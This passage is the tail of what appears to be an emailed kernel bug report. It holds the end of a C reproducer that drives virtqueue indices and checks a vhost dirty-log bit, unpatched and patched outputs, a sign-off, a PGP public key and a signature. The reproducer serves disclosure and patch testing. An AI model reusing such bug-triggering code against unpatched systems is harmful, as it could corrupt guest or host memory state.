+	if (sendto(pkt, frame0, sizeof(frame0), 0, NULL, 0) !=3D sizeof(frame0))
+		die("sendto frame0");
+	if (sendto(pkt, frame1, sizeof(frame1), 0, NULL, 0) !=3D sizeof(frame1))
+		die("sendto frame1");
+
+	publish_avail(avail, VQ_NUM);
+	kick(kick_fd);
+	usleep(100 * 1000);
+	publish_avail(avail, NHEADS0);
+	kick(kick_fd);
+
+	for (int i =3D 0; i < 5000000 && *(volatile u8 *)(buf0 + 12) =3D=3D 0; i+=
++)
+		;
+	publish_avail(avail, TOTAL_AVAIL);
+
+	for (int i =3D 0; i < 30 && used->idx < TOTAL_AVAIL; i++)
+		usleep(100 * 1000);
+
+	printf("avail->idx=3D%u used->idx=3D%u log_base[0]=3D0x%02x log_base[1]=3D=
+0x%02x\n",
+	       avail->idx, used->idx, log_base[0], log_base[1]);
+	if (used->idx !=3D TOTAL_AVAIL)
+		return 3;
+	return log_base[1] ? 2 : 0;
+}
+---->8----
+
+unpatched: avail->idx=3D65 used->idx=3D65 log_base[0]=3D0x80 log_base[1]=3D=
+0x01 (exit 2)
+patched:   avail->idx=3D65 used->idx=3D65 log_base[0]=3D0x80 log_base[1]=3D=
+0x00 (exit 0)
+
+Thanks,
+YanXin
+-----------------------db2a6f9e247f33a80a9db7509317076d
+Content-Type: application/pgp-keys; filename="publickey - fadouse@pm.me - 0x99485AA3.asc"; name="publickey - fadouse@pm.me - 0x99485AA3.asc"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="publickey - fadouse@pm.me - 0x99485AA3.asc"; name="publickey - fadouse@pm.me - 0x99485AA3.asc"
+
+LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tCgp4ak1FYVV1T01SWUpLd1lCQkFI
+YVJ3OEJBUWRBdG5ZbFN6SFRMSEEySXp1TkUxQXk4SnJLVUN4NmhQKy8KdGM0TERYQ25yZXpOSFda
+aFpHOTFjMlZBY0cwdWJXVWdQR1poWkc5MWMyVkFjRzB1YldVK3dzQVJCQk1XCkNnQ0RCWUpwUzQ0
+eEF3c0pCd2tRdVoxZ3QrWG0yWFJGRkFBQUFBQUFIQUFnYzJGc2RFQnViM1JoZEdsdgpibk11YjNC
+bGJuQm5jR3B6TG05eVp6bTBCcDNlRVhSV2tuSWdDbFd3dmR4Wm1vMVhuVmI2RmthalhUVk0KMUIv
+akF4VUtDQVFXQUFJQkFoa0JBcHNEQWg0QkZpRUVtVWhhbzNaL0FuQkk0TEJZdVoxZ3QrWG0yWFFB
+CkFMcTJBUUQ3OEs2cGVkU1gzbGROeXFkM09IMXVNak8zdjdMWU1oTytsN2NuU0xXckVBRCtPQ1Nx
+MTFTZQphS29ic1ZHckxlalRNc21Nc1BCOGpueGZpZDNoQ04rcGV3VE9PQVJwUzQ0eEVnb3JCZ0VF
+QVpkVkFRVUIKQVFkQXdYZHpWSXFFSC94OEhaalIvUE90MkFpRmJFbTZZcVhYMmoydjJpS0RzUU1E
+QVFnSHdyNEVHQllLCkFIQUZnbWxMampFSkVMbWRZTGZsNXRsMFJSUUFBQUFBQUJ3QUlITmhiSFJB
+Ym05MFlYUnBiMjV6TG05dwpaVzV3WjNCcWN5NXZjbWRkS05RWURGV2NFVmQzeE9IZVFwNnN5bjc5
+TkZwTnFrSHoraXpwSUxCblVnS2IKREJZaEJKbElXcU4yZndKd1NPQ3dXTG1kWUxmbDV0bDBBQUR6
+UWdEL2NJSjA4OUprbm9nVHM2dnZRWitKCjNMUklEYUk5K1FtK1Q1cU9tTms0eVhFQkFMUElsSkNT
+OGFoNWRCWVphOUwrSHFqYkRtZVNnRG81OHVTeAoraVd3KzZVTAo9TXVzVAotLS0tLUVORCBQR1Ag
+UFVCTElDIEtFWSBCTE9DSy0tLS0tCg==
+-----------------------db2a6f9e247f33a80a9db7509317076d--
+
+--------131195ce22d4e3494741ac7e4a8fcd905c43f07926a9b8163a5d63b446f9ad82
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+wrsEARYKAG0FgmsEMhIJELmdYLfl5tl0RRQAAAAAABwAIHNhbHRAbm90YXRp
+b25zLm9wZW5wZ3Bqcy5vcmc6DEGO4FmydXLK4uX6uT4FRrKSW2K1NE7sPXWB
+4r0ZfBYhBJlIWqN2fwJwSOCwWLmdYLfl5tl0AAAuIAD+IvChTnLjCRfefwKS
+b63Mi/ku38U3TMyguYNcYTi1BaIBAMhH95MbkJJJj8oAiazsDvCQCM3kkQSL
+smpgMmWhnawI
+=yU1D
+-----END PGP SIGNATURE-----
+
+
+--------131195ce22d4e3494741ac7e4a8fcd905c43f07926a9b8163a5d63b446f9ad82--
 
